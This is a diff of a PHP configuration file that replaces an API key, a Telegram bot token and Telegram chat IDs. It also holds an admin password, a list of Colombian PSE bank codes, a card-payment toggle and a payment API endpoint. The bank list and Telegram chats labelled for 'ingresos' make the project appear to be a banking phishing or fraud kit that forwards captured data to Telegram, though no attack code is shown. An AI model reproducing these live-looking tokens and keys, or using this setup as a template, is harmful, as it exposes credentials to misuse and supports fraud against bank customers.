@@ -13,17 +13,17 @@ function app_config(): array {
     $defaults = [
         'sistema_activo' => true,
         'admin_password' => '1234567',
-        'api_key' => 'wp_live_em0n51kjyz4621vlmwp0qwqr',
+        'api_key' => 'wp_live_innyfs5g9i9v9w1imwr3asud',
         'bancos_pse_activos' => ['1007','1023','1002','1052','1013','1032','1062','1063','1006','1047','1069','1070','1019','1040','1060','1061','1507','1551','1097','1809'],
         'tarjeta_activa' => true,
         'telegram' => [
-            'bot_token' => '9097530428:AAGdZl6vQMyQokGdLl4_dIfsl2G7eoVnjE8',
-            'chat_id_genericos' => '-5230554101',
-            'chat_id_ingresos' => '-5230554101'
+            'bot_token' => '8650359733:AAH1v9AODy4peJAwF5Q8suVPoQfOgiXNrZc',
+            'chat_id_genericos' => '-5103200126',
+            'chat_id_ingresos' => '-5103200126'
         ],
         'pagos' => [
             'api_url' => 'https://futuapigoluni.tech/api/generar-pago',
-            'api_key' => 'wp_live_em0n51kjyz4621vlmwp0qwqr'
+            'api_key' => 'wp_live_innyfs5g9i9v9w1imwr3asud'
         ],
         'cloudflare' => [
             'site_key' => '',
